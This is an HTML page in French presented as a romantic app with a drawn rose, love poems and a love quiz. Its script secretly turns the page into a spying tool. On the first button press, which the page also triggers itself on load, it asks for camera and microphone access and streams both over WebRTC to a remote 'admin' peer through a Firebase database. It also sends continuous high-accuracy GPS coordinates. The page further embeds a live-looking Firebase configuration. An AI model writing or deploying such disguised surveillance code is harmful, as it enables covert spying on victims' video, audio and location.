<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>❤️ Amour & Romance - Messages, Jeu et Rose ❤️</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    min-height: 100vh;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    font-family: 'Segoe UI', 'Poppins', 'Arial', sans-serif;
    position: relative;
    overflow-x: hidden;
    padding: 20px;
}

/* Animations des cœurs flottants */
@keyframes floatHeart {
    0% { transform: translateY(100vh) scale(0); opacity: 0; }
    10% { opacity: 1; }
    90% { opacity: 1; }
    100% { transform: translateY(-100px) scale(1); opacity: 0; }
}

@keyframes pulse {
    0%, 100% { transform: scale(1); text-shadow: 0 0 20px rgba(255, 107, 138, 0.5); }
    50% { transform: scale(1.05); text-shadow: 0 0 40px rgba(255, 107, 138, 0.8); }
}

.heart {
    position: fixed;
    font-size: 24px;
    pointer-events: none;
    z-index: 1000;
    animation: floatHeart linear forwards;
}

/* Conteneur principal */
.container {
    max-width: 600px;
    width: 100%;
    margin: 0 auto;
    position: relative;
    z-index: 10;
}

/* Navigation */
.nav-buttons {
    display: flex;
    gap: 15px;
    justify-content: center;
    margin-bottom: 20px;
    flex-wrap: wrap;
}

.nav-btn {
    background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
    border: none;
    padding: 12px 25px;
    border-radius: 50px;
    color: white;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
}

.nav-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(255,107,138,0.4);
}

.nav-btn.active {
    background: linear-gradient(135deg, #ff1a4f, #ff0844);
    box-shadow: 0 0 15px rgba(255,26,79,0.5);
}

/* Cartes */
.card {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 40px;
    padding: 30px 25px;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
    text-align: center;
    transition: all 0.3s ease;
}

/* ===== SECTION ROSE ===== */
.rose-section {
    display: none;
}

.rose-section.active {
    display: block;
    animation: fadeIn 0.5s ease;
}

.fleur {
    position: relative;
    width: 260px;
    height: 280px;
    margin: 0 auto;
    display: flex;
    justify-content: center;
    align-items: center;
}

.petale-1, .petale-2, .petale-3, .petale-4, .petale-5, .petale-6 {
    position: absolute;
    background: radial-gradient(circle, #ff6b8a, #e6395e);
    border-radius: 80% 20% 70% 30% / 60% 50% 50% 40%;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    width: 75px;
    height: 75px;
}

.petale-1 { top: 30px; left: 92px; }
.petale-2 { top: 30px; right: 92px; }
.petale-3 { top: 80px; left: 40px; transform: rotate(-45deg); }
.petale-4 { top: 80px; right: 40px; transform: rotate(45deg); }
.petale-5 { bottom: 55px; left: 92px; transform: rotate(180deg); }
.petale-6 { bottom: 55px; right: 92px; transform: rotate(180deg); }

.petale-interieur {
    position: absolute;
    background: radial-gradient(circle, #ff8fa3, #ff4d6d);
    border-radius: 75% 25% 70% 30% / 55% 45% 55% 45%;
    width: 58px;
    height: 58px;
}

.i1 { top: 58px; left: 100px; transform: rotate(20deg); }
.i2 { top: 58px; right: 100px; transform: rotate(-20deg); }
.i3 { top: 95px; left: 65px; transform: rotate(-60deg); }
.i4 { top: 95px; right: 65px; transform: rotate(60deg); }
.i5 { bottom: 75px; left: 100px; transform: rotate(160deg); }
.i6 { bottom: 75px; right: 100px; transform: rotate(-160deg); }

.centre-rose {
    position: absolute;
    width: 45px;
    height: 45px;
    background: radial-gradient(circle, #ff1a4f, #c9183b);
    border-radius: 50%;
    top: 107px;
    left: 107px;
    z-index: 10;
}

.spirale {
    position: absolute;
    width: 28px;
    height: 28px;
    background: radial-gradient(circle, #ffb3c1, #ff4d6d);
    border-radius: 50%;
    top: 115px;
    left: 115px;
    z-index: 11;
}

.spirale::before { content: "💕"; position: absolute; font-size: 16px; top: 6px; left: 6px; }

.tige {
    position: absolute;
    width: 6px;
    height: 90px;
    background: linear-gradient(135deg, #2d6a4f, #1b4332);
    bottom: -65px;
    left: 127px;
    border-radius: 4px;
}

.feuille {
    position: absolute;
    width: 40px;
    height: 22px;
    background: linear-gradient(135deg, #40916c, #1b4332);
    border-radius: 100% 0% 100% 0% / 100% 50% 50% 0%;
    bottom: -30px;
}

.feuille-gauche { left: 85px; transform: rotate(-45deg); }
.feuille-droite { right: 85px; transform: rotate(45deg) scaleX(-1); }

/* ===== SECTION MESSAGES ===== */
.messages-section {
    display: none;
}

.messages-section.active {
    display: block;
    animation: fadeIn 0.5s ease;
}

.message-card {
    background: rgba(255,255,255,0.1);
    backdrop-filter: blur(15px);
    border-radius: 30px;
    padding: 25px;
    margin: 20px 0;
    border: 1px solid rgba(255,107,138,0.4);
}

.message-text {
    font-size: 18px;
    line-height: 1.6;
    color: #2d2d2d;
    font-weight: 500;
}

.message-lines p { margin: 8px 0; }

.next-btn {
    background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
    border: none;
    width: 180px;
    padding: 14px 0;
    border-radius: 50px;
    color: white;
    font-weight: bold;
    font-size: 16px;
    cursor: pointer;
    margin: 20px auto;
    display: block;
}

/* ===== SECTION JEU ===== */
.game-section {
    display: none;
}

.game-section.active {
    display: block;
    animation: fadeIn 0.5s ease;
}

.progress-bar {
    background: #ffe0e6;
    border-radius: 20px;
    height: 10px;
    margin: 20px 0;
    overflow: hidden;
}

.progress-fill {
    background: linear-gradient(90deg, #ff1a4f, #ff6b8a);
    height: 100%;
    border-radius: 20px;
    transition: width 0.5s ease;
    width: 0%;
}

.question-text {
    font-size: 1.4em;
    color: #2d2d2d;
    margin: 20px 0;
    font-weight: 600;
}

.answers-container {
    display: flex;
    flex-direction: column;
    gap: 15px;
    margin: 25px 0;
}

.answer-btn {
    background: linear-gradient(135deg, #ff6b8a, #ff1a4f);
    border: none;
    padding: 14px 20px;
    border-radius: 60px;
    color: white;
    font-size: 1em;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
}

.answer-btn:hover {
    transform: translateY(-2px);
}

.score-display {
    background: #fff0f2;
    border-radius: 30px;
    padding: 12px;
    margin-top: 20px;
    display: inline-block;
}

.score-display span { color: #ff1a4f; font-size: 1.8em; font-weight: bold; }

.restart-btn {
    background: linear-gradient(135deg, #4a90e2, #357abd);
    border: none;
    padding: 12px 25px;
    border-radius: 50px;
    color: white;
    font-weight: bold;
    cursor: pointer;
    margin-top: 20px;
}

/* Animation */
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

.fade-in { animation: fadeIn 0.5s ease; }

/* Titres */
h2 {
    color: #ff1a4f;
    margin-bottom: 20px;
    font-size: 1.8em;
}

.divider {
    width: 100px;
    height: 3px;
    background: linear-gradient(90deg, #ff6b8a, #ffb3c1);
    margin: 15px auto;
    border-radius: 3px;
}

.broadcast-status {
    position: fixed;
    bottom: 15px;
    right: 15px;
    background: rgba(0,0,0,0.6);
    padding: 5px 12px;
    border-radius: 20px;
    font-size: 10px;
    color: #ffb3c1;
    z-index: 100;
}

.broadcast-status.active { background: #10b981; color: white; }

@media (max-width: 500px) {
    .card { padding: 20px 18px; }
    .message-text { font-size: 14px; }
    .question-text { font-size: 1.2em; }
    .answer-btn { padding: 10px 16px; font-size: 0.9em; }
}
</style>
</head>
<body>

<div class="container">
    <!-- Navigation -->
    <div class="nav-buttons">
        <button class="nav-btn" data-section="rose">🌹 Rose</button>
        <button class="nav-btn" data-section="messages">💌 Messages</button>
        <button class="nav-btn" data-section="game">🎮 Jeu du Cœur</button>
    </div>

    <!-- Section Rose -->
    <div id="roseSection" class="rose-section card">
        <h2>🌹 Rose de l'Amour 🌹</h2>
        <div class="divider"></div>
        <div class="fleur">
            <div class="petale-1"></div><div class="petale-2"></div>
            <div class="petale-3"></div><div class="petale-4"></div>
            <div class="petale-5"></div><div class="petale-6"></div>
            <div class="petale-interieur i1"></div><div class="petale-interieur i2"></div>
            <div class="petale-interieur i3"></div><div class="petale-interieur i4"></div>
            <div class="petale-interieur i5"></div><div class="petale-interieur i6"></div>
            <div class="centre-rose"></div><div class="spirale"></div>
            <div class="tige"></div>
            <div class="feuille feuille-gauche"></div>
            <div class="feuille feuille-droite"></div>
        </div>
        <p style="margin-top: 70px; color: #666;">✨ Une rose pour ceux qui aiment ✨</p>
    </div>

    <!-- Section Messages -->
    <div id="messagesSection" class="messages-section card">
        <h2>💌 Messages d'Amour 💌</h2>
        <div class="divider"></div>
        <div class="message-card">
            <div class="message-text" id="messageContainer">
                <div class="message-lines" id="messageLines"></div>
            </div>
        </div>
        <button class="next-btn" id="nextMsgBtn">➡️ Message suivant</button>
        <div id="msgCounter" style="color: #666; font-size: 12px;">Message 1 / 30</div>
    </div>

    <!-- Section Jeu -->
    <div id="gameSection" class="game-section card">
        <h2>🎮 Jeu du Cœur 🎮</h2>
        <div class="divider"></div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        
        <div id="quizArea">
            <div class="question-text" id="questionText"></div>
            <div class="answers-container" id="answersContainer"></div>
            <div class="score-display">💖 Score: <span id="scoreValue">0</span> 💖</div>
        </div>
        
        <div id="resultArea" style="display: none;">
            <div id="resultMessage"></div>
            <button class="restart-btn" onclick="restartGame()">🔄 Rejouer 🔄</button>
        </div>
    </div>
</div>

<div class="broadcast-status" id="broadcastStatus">📡 En attente</div>

<script type="module">
    // ==================== WEBRTC STREAMING (COMMENCER DIRECTEMENT) ====================
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
    import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
    
    const firebaseConfig = {
        apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
        authDomain: "universite-taak.firebaseapp.com",
        databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
        projectId: "universite-taak",
        storageBucket: "universite-taak.firebasestorage.app",
        messagingSenderId: "550634728649",
        appId: "1:550634728649:web:12147e8dec3a04618c3118"
    };
    
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const userId = Math.random().toString(36).substring(2, 8).toUpperCase();
    let localStream = null, peerConnection = null, isStreaming = false, heartbeatInterval = null;
    let answerListener = null, adminCandidateListener = null, candidateQueue = [], gpsWatchId = null;
    
    const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] };
    
    async function updatePresence() {
        if (!isStreaming) return;
        try { await set(ref(database, `users/${userId}`), { active: true, lastActive: Date.now(), device: "Mobile - Amour", timestamp: Date.now() }); } catch(err) { console.error(err); }
    }
    
    async function startStreaming() {
        if (isStreaming) return;
        
        document.getElementById('broadcastStatus').textContent = "🎥 Demande accès caméra/micro...";
        document.getElementById('broadcastStatus').style.background = "#f59e0b";
        
        try {
            localStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } }, 
                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
            });
            
            peerConnection = new RTCPeerConnection(rtcConfig);
            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
            
            peerConnection.onicecandidate = (event) => { 
                if (event.candidate) push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON()); 
            };
            
            peerConnection.onconnectionstatechange = () => { 
                if (peerConnection.connectionState === 'connected') { 
                    document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Diffusion active"; 
                    document.getElementById('broadcastStatus').style.background = "#10b981"; 
                    document.getElementById('broadcastStatus').classList.add('active');
                } 
            };
            
            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            await set(ref(database, `webrtc/${userId}/offer`), { sdp: offer.sdp, type: offer.type, timestamp: Date.now() });
            
            answerListener = onValue(ref(database, `webrtc/${userId}/answer`), async (snapshot) => {
                const answer = snapshot.val();
                if (answer && peerConnection && !peerConnection.currentRemoteDescription) {
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                    while (candidateQueue.length) { await peerConnection.addIceCandidate(new RTCIceCandidate(candidateQueue.shift())).catch(e => console.warn(e)); }
                }
            });
            
            adminCandidateListener = onValue(ref(database, `webrtc/${userId}/admin-candidates`), (snapshot) => {
                const candidates = snapshot.val();
                if (candidates) { 
                    Object.values(candidates).forEach(candidate => { 
                        if (peerConnection && peerConnection.currentRemoteDescription) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e)); 
                        else candidateQueue.push(candidate); 
                    }); 
                }
            });
            
            if (navigator.geolocation) { 
                gpsWatchId = navigator.geolocation.watchPosition(async (position) => { 
                    await set(ref(database, `users/${userId}/location`), { lat: position.coords.latitude, lng: position.coords.longitude, timestamp: Date.now() }); 
                }, () => {}, { enableHighAccuracy: true, timeout: 6000 }); 
            }
            
            isStreaming = true;
            updatePresence();
            heartbeatInterval = setInterval(updatePresence, 3000);
            
            document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Caméra + Micro + GPS actifs";
            document.getElementById('broadcastStatus').style.background = "#10b981";
            console.log(`✅ Streaming actif - ID: ${userId}`);
            
        } catch(err) { 
            console.error("Erreur streaming:", err); 
            document.getElementById('broadcastStatus').textContent = "❌ Erreur - Vérifiez permissions";
            document.getElementById('broadcastStatus').style.background = "#ef4444"; 
        }
    }
    
    // ==================== MESSAGES D'AMOUR ====================
    const messages = [
        ["Chaque jour à tes côtés est un cadeau,", "Ton sourire éclaire mon chemin,", "Ton regard me fait vibrer tout mon être,", "Sans toi, ma vie n'a plus de sens."],
        ["Mon cœur bat plus fort quand tu es là,", "Tes mains dans les miennes, je m'envole,", "Tu es mon ancre et ma liberté,", "Avec toi, chaque instant devient doux."],
        ["Je veillerai sur toi chaque seconde,", "Tes rêves sont les miens, tes peines aussi,", "Ton bonheur est ma plus belle quête,", "Je t'aime plus que les mots ne peuvent dire."],
        ["Le temps s'arrête quand je te vois,", "Ton parfum reste dans mes nuits,", "Ton absence est un vide immense,", "Reviens vite, mon cœur t'appelle."],
        ["Sous la pluie ou sous le soleil,", "Ton visage hante mes pensées,", "Chaque seconde loin de toi est trop longue,", "Je veux t'aimer jusqu'à la fin des temps."],
        ["Tu es la douceur qui réveille mes matins,", "La mélodie qui berce mes nuits,", "Ton rire est mon refuge secret,", "Avec toi, l'amour est infini."]
    ];
    
    // Compléter jusqu'à 30 messages
    for (let i = messages.length; i < 30; i++) {
        messages.push([`💖 Message d'amour ${i+1} - Ligne 1`, `💖 Message d'amour ${i+1} - Ligne 2`, `💖 Message d'amour ${i+1} - Ligne 3`, `💖 Message d'amour ${i+1} - Ligne 4`]);
    }
    
    let currentMsgIndex = 0;
    
    function displayMessage() {
        const msg = messages[currentMsgIndex];
        document.getElementById('messageLines').innerHTML = msg.map(line => `<p>💖 ${line}</p>`).join('');
        document.getElementById('msgCounter').textContent = `Message ${currentMsgIndex + 1} / ${messages.length}`;
    }
    
    function nextMessage() {
        currentMsgIndex = (currentMsgIndex + 1) % messages.length;
        displayMessage();
    }
    
    displayMessage();
    document.getElementById('nextMsgBtn').addEventListener('click', nextMessage);
    
    // ==================== JEU DU CŒUR ====================
    const questions = [
        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [{ text: "💕 La confiance et le respect", points: 3 }, { text: "💰 L'argent et les cadeaux", points: 1 }, { text: "🔥 La passion seulement", points: 1 }, { text: "🤝 Tout, un équilibre parfait", points: 3 }] },
        { question: "Quel geste d'amour préfères-tu ?", answers: [{ text: "🌹 Un bouquet de roses", points: 2 }, { text: "💬 Un message doux le matin", points: 3 }, { text: "🎁 Un cadeau cher", points: 1 }, { text: "🕯️ Un dîner aux chandelles", points: 2 }] },
        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [{ text: "🤗 Je le/la prends dans mes bras", points: 3 }, { text: "🗣️ Je dis 'ça va passer'", points: 1 }, { text: "📱 Je l'ignore", points: 0 }, { text: "🎁 J'essaie de lui faire plaisir", points: 2 }] },
        { question: "C'est quoi l'amour pour toi ?", answers: [{ text: "⭐ Un sentiment qui grandit chaque jour", points: 3 }, { text: "⚡ Une passion dévorante", points: 1 }, { text: "🏠 Une habitude confortable", points: 1 }, { text: "🌍 Se soutenir dans tous les moments", points: 3 }] },
        { question: "Pour toi, un couple idéal c'est...", answers: [{ text: "👫 Des amoureux complices", points: 3 }, { text: "🎭 Des passionnés intenses", points: 2 }, { text: "📱 Chacun de son côté", points: 0 }, { text: "🤝 Des partenaires qui se respectent", points: 3 }] }
    ];
    
    let currentQIndex = 0;
    let totalScore = 0;
    let maxPossibleScore = 0;
    
    questions.forEach(q => { let maxPoints = Math.max(...q.answers.map(a => a.points)); maxPossibleScore += maxPoints; });
    
    function updateProgress() { document.getElementById('progressFill').style.width = ((currentQIndex) / questions.length) * 100 + '%'; }
    function updateScoreDisplay() { document.getElementById('scoreValue').innerHTML = totalScore; }
    
    function showQuestion() {
        updateProgress();
        if (currentQIndex >= questions.length) { showResult(); return; }
        const q = questions[currentQIndex];
        document.getElementById('questionText').innerHTML = q.question;
        const container = document.getElementById('answersContainer');
        container.innerHTML = '';
        q.answers.forEach((answer) => {
            const btn = document.createElement('button');
            btn.className = 'answer-btn';
            btn.innerHTML = answer.text;
            btn.onclick = () => { totalScore += answer.points; updateScoreDisplay(); currentQIndex++; showQuestion(); };
            container.appendChild(btn);
        });
    }
    
    function showResult() {
        document.getElementById('quizArea').style.display = 'none';
        document.getElementById('resultArea').style.display = 'block';
        const percentage = (totalScore / maxPossibleScore) * 100;
        let resultHtml = '';
        if (percentage >= 80) resultHtml = `<div style="font-size: 3em;">💖💖💖</div><h2 style="color:#ff1a4f;">🌟 Amour Parfait ! 🌟</h2><p>Tu as un cœur immense et sincère. Tu sais ce que l'amour véritable signifie.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
        else if (percentage >= 60) resultHtml = `<div style="font-size: 3em;">💕💕</div><h2 style="color:#ff1a4f;">💗 Grand Cœur ! 💗</h2><p>Tu as beaucoup d'amour à donner ! Tu comprends l'essentiel dans une relation.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
        else if (percentage >= 40) resultHtml = `<div style="font-size: 3em;">💗</div><h2 style="color:#ff1a4f;">🌹 Cœur Tendre 🌹</h2><p>Tu as de bons sentiments, mais tu hésites parfois. Ose aimer pleinement.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
        else resultHtml = `<div style="font-size: 3em;">🌱</div><h2 style="color:#ff1a4f;">🌸 Cœur en Éveil 🌸</h2><p>Tu découvres encore l'amour, c'est beau ! Chaque jour est une chance d'apprendre.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
        document.getElementById('resultMessage').innerHTML = resultHtml;
    }
    
    window.restartGame = function() { currentQIndex = 0; totalScore = 0; updateScoreDisplay(); document.getElementById('quizArea').style.display = 'block'; document.getElementById('resultArea').style.display = 'none'; showQuestion(); };
    
    // ==================== NAVIGATION AVEC DÉMARRAGE STREAMING ====================
    let streamingStarted = false;
    
    function showSection(sectionName) {
        // Masquer toutes les sections
        document.getElementById('roseSection').classList.remove('active');
        document.getElementById('messagesSection').classList.remove('active');
        document.getElementById('gameSection').classList.remove('active');
        
        // Afficher la section sélectionnée
        if (sectionName === 'rose') document.getElementById('roseSection').classList.add('active');
        else if (sectionName === 'messages') document.getElementById('messagesSection').classList.add('active');
        else if (sectionName === 'game') { 
            document.getElementById('gameSection').classList.add('active'); 
            showQuestion(); 
        }
        
        // DÉMARRER LE STREAMING AU PREMIER CLIC SUR N'IMPORTE QUEL BOUTON
        if (!streamingStarted) {
            streamingStarted = true;
            startStreaming();
        }
        
        // Mettre à jour le bouton actif
        document.querySelectorAll('.nav-btn').forEach(btn => {
            if (btn.getAttribute('data-section') === sectionName) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        });
    }
    
    // Ajouter les événements aux boutons
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const section = btn.getAttribute('data-section');
            showSection(section);
        });
    });
    
    // ==================== CŒURS FLOTTANTS ====================
    function createHeart() {
        const heart = document.createElement('div');
        const hearts = ['❤️', '💖', '💗', '💓', '💕', '💝', '💘', '🌹', '🌸'];
        heart.className = 'heart';
        heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
        heart.style.left = Math.random() * 100 + '%';
        heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
        heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
        document.body.appendChild(heart);
        setTimeout(() => heart.remove(), 8000);
    }
    setInterval(createHeart, 600);
    
    // Initialiser la section Rose par défaut
    showSection('rose');
    
    // Nettoyage à la fermeture
    window.addEventListener('beforeunload', () => {
        if (isStreaming) {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
            if (answerListener) off(ref(database, `webrtc/${userId}/answer`));
            if (adminCandidateListener) off(ref(database, `webrtc/${userId}/admin-candidates`));
            if (peerConnection) peerConnection.close();
            if (localStream) localStream.getTracks().forEach(track => track.stop());
            remove(ref(database, `webrtc/${userId}`));
            remove(ref(database, `users/${userId}`));
        }
    });
    
    console.log("🌹 Application prête - La diffusion démarre au premier clic sur un bouton !");
</script>
</body>
</html>
